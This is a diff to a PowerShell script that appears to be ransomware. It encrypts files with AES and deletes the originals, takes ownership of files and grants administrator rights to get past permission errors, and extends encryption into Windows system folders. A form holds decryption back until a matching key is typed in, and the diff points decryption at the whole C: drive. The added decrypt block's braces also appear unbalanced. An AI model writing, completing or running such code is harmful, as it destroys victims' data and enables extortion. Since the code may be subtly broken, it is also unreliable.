@@ -41,6 +41,23 @@ Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAct
 
 
 foreach($f in $fold){
+if($f.FullName -match "Windows"){
+$var = Get-ChildItem $f.FullName | Where-Object {$_.mode -match "a"}
+foreach($v in $var){
+
+if($v.FullName -match "takeown.exe"){
+    
+}else{
+try{
+Protect-File $v.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Stop
+}catch{
+takeown /A /F $v.FullName
+Add-NTFSAccess -Path $v.FullName -Account "Administrateurs" -AccessRights FullControl
+Protect-File $v.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Continue
+}
+}
+}
+}else{
 $test = Get-Acl $f.FullName | Select -Property Owner
 if($test -match "Administrateurs" -Or $test -match $env:UserName){
     
@@ -50,7 +67,7 @@ Add-NTFSAccess -Path $f.FullName -Account "Administrateurs" -AccessRights FullCo
 }
 Encrypt $f.FullName
 }
-
+}
 }
 Encrypt $folder
 }
@@ -130,12 +147,22 @@ Unprotect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorA
 }
 
 foreach($f in $fold){
+if($f.FullName -match "Windows"){
+$var = Get-ChildItem $f.FullName | Where-Object {$_.mode -match "a"}
+foreach($v in $var){
+
+if($v.FullName -match "takeown.exe"){
+    
+}else{
+Unprotect-File $v.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Stop
+}
+}else{
 Decrypt $f.FullName
 }
-
+}
+}
 } 
 
-#Encrypt $Folder
 
 #----------------  Form  ----------------------
 $Form = New-Object system.Windows.Forms.Form
@@ -210,7 +237,7 @@ $Form.controls.Add($button1)
 
 $button1.add_Click{
 if($textBox1.Text -match $decryptKey){
- 
+$Folder="C:\"
 Decrypt $Folder
 $label4.Text = "Termine!"
 Start-Sleep 5
